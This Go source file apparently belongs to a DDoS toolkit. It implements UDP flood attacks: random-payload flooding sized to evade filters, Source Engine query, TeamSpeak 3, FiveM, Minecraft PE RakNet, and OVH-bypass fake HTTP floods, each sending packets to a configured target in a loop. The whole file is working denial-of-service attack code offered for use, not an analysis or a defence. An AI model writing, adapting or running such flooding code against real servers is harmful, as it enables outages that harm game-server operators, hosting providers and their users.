package layer4

import (
	"context"
	"crypto/rand"
	"fmt"
	mrand "math/rand/v2"
	"net"
	"strconv"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// UDPAttack implements UDP-based attacks
type UDPAttack struct {
	Config *core.AttackConfig
	Method string
}

func NewUDPAttack(cfg *core.AttackConfig, method string) *UDPAttack {
	return &UDPAttack{
		Config: cfg,
		Method: method,
	}
}

func (u *UDPAttack) Attack(ctx context.Context) error {
	switch u.Method {
	case "UDP":
		return u.executeUDP(ctx)
	case "VSE":
		return u.executeVSE(ctx)
	case "TS3":
		return u.executeTS3(ctx)
	case "FIVEM":
		return u.executeFIVEM(ctx)
	case "FIVEM-TOKEN":
		return u.executeFIVEMTOKEN(ctx)
	case "MCPE":
		return u.executeMCPE(ctx)
	case "OVH-UDP":
		return u.executeOVHUDP(ctx)
	default:
		return u.executeUDP(ctx)
	}
}

func (u *UDPAttack) executeUDP(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Random payload size between 64 and 1024 bytes to avoid static filtering
	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		size := utils.RandInt(64, 1024)
		data := utils.RandomBytes(size)
		n, err := conn.Write(data)
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeVSE(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	payload := []byte{
		0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75,
		0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69,
		0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00,
	}

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeTS3(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	payload := []byte{
		0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89,
		0x00, 0x00, 0x00, 0x00, 0x02,
	}

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeFIVEM(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	payload := []byte{0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00}

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeFIVEMTOKEN(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		token := fmt.Sprintf("%s-%s-%s-%s",
			utils.RandString(8), utils.RandString(4), utils.RandString(4), utils.RandString(12))
		guid := fmt.Sprintf("%d", 76561197960265728+mrand.Int64N(39734735271))

		payload := fmt.Sprintf("token=%s&guid=%s", token, guid)
		n, err := conn.Write([]byte(payload))
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeMCPE(ctx context.Context) error {
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	// RakNet Unconnected Ping Payload
	// 0x01 (Unconnected Ping) + 8 bytes timestamp + 8 bytes magic + 8 bytes client GUID
	payload := []byte{
		0x01,                                           // ID
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (empty)
		0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78, // Magic
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Client GUID
	}
	// Add random GUID
	rand.Read(payload[len(payload)-8:])

	for i := 0; i < 100; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (u *UDPAttack) executeOVHUDP(ctx context.Context) error {
	// OVH-UDP logic from original
	addr, err := net.ResolveUDPAddr("udp", u.Config.Target)
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
	paths := []string{"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\", "/", "/null", "/%00%00%00%00"}

	// We need to parse host/port from target string again since OVHUDP builds a fake HTTP payload with Host header
	host, portStr, _ := net.SplitHostPort(u.Config.Target)
	port, _ := strconv.Atoi(portStr)

	for i := 0; i < utils.RandInt(2, 4); i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		payloadSize := utils.RandInt(1024, 2048)
		randomPart := string(utils.RandomBytes(payloadSize))

		method := methods[mrand.IntN(len(methods))]
		path := paths[mrand.IntN(len(paths))]

		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
			method, path, randomPart, host, port)

		n, err := conn.Write([]byte(payload))
		if err != nil {
			break
		}
		u.Config.RequestsSent.Add(1)
		u.Config.BytesSent.Add(int64(n))
	}
	return nil
}
